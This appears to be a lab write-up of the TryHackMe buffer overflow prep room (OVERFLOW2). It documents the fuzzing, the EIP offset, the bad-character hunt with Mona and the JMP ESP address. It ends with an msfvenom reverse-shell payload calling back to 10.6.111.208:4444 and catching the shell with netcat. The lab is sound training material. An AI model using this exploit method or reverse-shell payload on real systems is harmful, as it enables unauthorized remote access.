---
description: https://tryhackme.com/room/bufferoverflowprep (oscp.exe)
---

# OVERFLOW2

## Methodology

1\. Spiking or Playing with the program

2\. Fuzzing

3\. Controlling the EIP

4\. Finding Bad Characters

5\. Finding a Jump Point

6\. Generating a Payload

7\. "NOP Sledding"

8\. Exploitation

## Spiking or Playing

* Opened up the vulnerable program in Immunity
* Ran the program
* Noticed in Command Prompt that it is running a server on 1337
* Connected to the program via Netcat to see the inner workings of the program

## Mona Configuration

Place the following into the debugger window of Immunity:

```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

* Utilize the <mark style="color:yellow;">fuzzer.py</mark> script to fuzz the program in an attempt to see where we can make the program break
* Be sure to note when the program crashes (what bytes)
* Run the command and configure as needed (Change IP address and prefix to OVERFLOW2)

<figure><img src="../.gitbook/assets/image (14) (3).png" alt=""><figcaption></figcaption></figure>

Running the fuzzer:

<figure><img src="../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">We note that it crashed at 700 bytes</mark>

## Crash Replication and Controlling EIP

* We will now utilize <mark style="color:yellow;">exploit.py</mark>

Contents of exploit.py:

<figure><img src="../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>

### msf\_pattern\_create

* We now need to generate a program that is a length of 300-400 bytes longer than the string that crashed the program
* This is because we need to still make room for the payload in memory
* <mark style="color:yellow;">1000</mark> bytes is what we will use

Use the following command to generate your pattern:

```
msf-pattern_create -l 1000
```

* Copy/paste the string into the <mark style="color:yellow;">payload</mark> section of <mark style="color:yellow;">exploit.py</mark>
* Return to Immunity and restart the program and run it again
* Now that the program is running, it is time to run our new exploit
* Upon executing, we should see the following in Immunity debugger:

<mark style="color:yellow;">Access violation when executing \[76413176]</mark>

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

* Notice that we are making an access violation occur on the EIP <mark style="color:yellow;">(76413176)</mark>

### Find the Distance from EIP

First, we need to find the offset value:

```
msf-pattern_offset -l 1000 -q 76413176
```

* <mark style="color:yellow;">1000</mark> is the bytes we used (300-400 above crash point)
* <mark style="color:yellow;">76413176 is the memory address of EIP</mark>
* Upon executing this, we are looking for the <mark style="color:yellow;">offset value</mark>

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

* We get an offset of <mark style="color:yellow;">634</mark>
* Go back to <mark style="color:yellow;">exploit.py</mark>
* <mark style="color:yellow;">Add 634 to the offset section</mark>
* <mark style="color:yellow;">Place BBBB in retn</mark>

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

* Restart the program in Immunity with Ctrl + Shift + F2
* Start the program with F9

<figure><img src="../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>

* We should get an access violation of <mark style="color:yellow;">42424242 for our EIP</mark>
* The 42's are the B's at the EIP
* Take note of the ESP address at this step because it will be used in the next step
  * <mark style="color:yellow;">ESP</mark>: <mark style="color:yellow;">01A7FA30</mark>

## Finding Bad Characters

* We need to generate a bytearray using Mona and exclude the null byte which is \x00

```
!mona bytearray -b "\x00"
```

* We will be using the <mark style="color:yellow;">badchars.py</mark> script to generate a string of bad chars from \x01 to \xff that is identical to the byte array

badchars.py:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

* Copy the string into the <mark style="color:yellow;">payload</mark> variable in <mark style="color:yellow;">exploit.py</mark>

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>

* I suggest using vim for this part as it will be easier to remove the bad chars in the coming steps

<figure><img src="../.gitbook/assets/image (2) (4) (1).png" alt=""><figcaption></figcaption></figure>

* Restart the program CTRL + SHIFT + F2
* Start the program F9
* Run the new exploit
* Take note of the address of where the ESP register is pointing to

<figure><img src="../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">0199FA30 is our ESP</mark>
* Right-click on the address and follow in dump
* We will now be able to identify the bad chars because they go out of order

<figure><img src="../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

* After 22, it should be 23 and 24!
* This means that there are some bad chars!
* Let's use mona to find the bad chars!

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0199FA30
```

* Place the address value of the <mark style="color:yellow;">ESP</mark> after the -a option
* In this case, our ESP address is <mark style="color:yellow;">0199FA30</mark>
* A new menu will pop up in Mona where it says "BadChars"
* This is a list of possible bad chars

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

```
23 24 3c 3d 83 84 ba bb
```

* Remember, NOT ALL OF THESE MAY BE BAD CHARACTERS
* The best way to approach this next part is to go one by one.
* Remove one bad character at a time by repeating the following steps:
  * Remove the character from the byte array
  * Remove character from exploit payload
  * Restart program
  * Start program
  * Compare using mona

### Attempt 1 (\x23)

1. Create a byte array and remove \x23 from the payload too

```
!mona bytearray -b "\x00\x23"
```

Search for 23 in the payload and remove with CTRL + Shift + F

2\. Run the exploit

3\. Check the ESP address <mark style="color:yellow;">01ACFA30</mark>

4\. Compare byte array in Mona

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01ACFA30
```

* We still get the following, so it is fair to say that we still have bad chars! Time to move on to the  next bad char
* Notice how 24 is not in it anymore (meaning it is okay)
* Time to move on to \x3c

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Attempt 2 (x3c)

1. Restart program
2. Start program
3. Create a new byte array in Mona

```
!mona bytearray -b "\x00\x23\x3c"
```

4\. Edit the exploit.py and remove \x3c from the payload variable

5\. Run the exploit and note the ESP address <mark style="color:yellow;">0198FA30</mark>

6\. Compare byte array in Mona

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
```

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

* We can see from the output that x3c was  a badchar and x3d was not one

Our bad chars now look like this:

```
\x00\x23\x3c\x83
```

### Attempt 3

1. Restart the program
2. Start the program
3. Create byte array in Mona

```
!mona bytearray -b "\x00\x23\x3c\x83"
```

4\. Edit exploit.py and remove \x83 from it and run the exploit

5\. Check the ESP value <mark style="color:yellow;">018FFA30</mark>

6\. Compare the byte array with the ESP value

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 018FFA30
```

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

* From the output, we see that \x83 was a badchar and \x84 was not one
* Time to move on to \xba
* Our new bytearray now looks like this&#x20;

```
\x00\x23\x3c\x83\xba
```

### Attempt 4

1. Restart program
2. Start program
3. create byte array in Mona

```
!mona bytearray -b "\x00\x23\x3c\x83\xba"
```

4\. Edit exploit.py and remove \xba and run the exploit

5\. Take note of the ESP address <mark style="color:yellow;">017CFA30</mark>

6\. Compare byte array in Mona

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30
```

<figure><img src="../.gitbook/assets/image (5) (2) (2).png" alt=""><figcaption></figcaption></figure>

We see the status of "<mark style="color:yellow;">Unmodified</mark>" this is exactly what we were chasing after!!!!!

That means that the following are the exact bad chars we need:

```
\x00\x23\x3c\x83\xba
```

## Finding a Jump Point

We can quickly find the jump point by using Mona:

```
!mona jmp -r esp -cpb “\x00\x23\x3c\x83\xba”
```

<figure><img src="../.gitbook/assets/image (7) (2) (1).png" alt=""><figcaption></figcaption></figure>

* We find 9 pointers
* This means that any of the addresses can be used as the retn value in the exploit
* Remember, little endian is being used here, this is the reverse order
* Let's choose the first address: <mark style="color:yellow;">625011AF</mark>

## Generating a Payload

Note the address: <mark style="color:yellow;">625011AF</mark>

1.  Modify the exploit.py and add this address in reverse order (little endian) to the retn variable

    <mark style="color:yellow;">"\xaf\x11\x50\x62"</mark>
2. Remove the payload and save the exploit
3. Copy the address of <mark style="color:yellow;">625011AF</mark>
4. Select the blue arrow button in Immunity and add the address in the popup
5. Right-click the JMP ESP > Breakpoint > Toggle
6. Run the exploit again
7. You will notice that a breakpoint occured!

### Msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c
```

1. Copy the shell code only
2. Open the exploit and add the shellcode to the payload section
3. <mark style="color:yellow;">Make sure that the EXITFUNC consists of the bad chars and not the RETN value</mark>

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

## NOP Sledding

* Add a padding of <mark style="color:yellow;">"\x90" \* 16</mark>
* Save the file

## Exploitation

1. Start a netcat listener on the port specified in the payload
2. Restart the program
3. Start the program
4. Go back to your exploit and run it
5. You should have a shell

<figure><img src="../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

















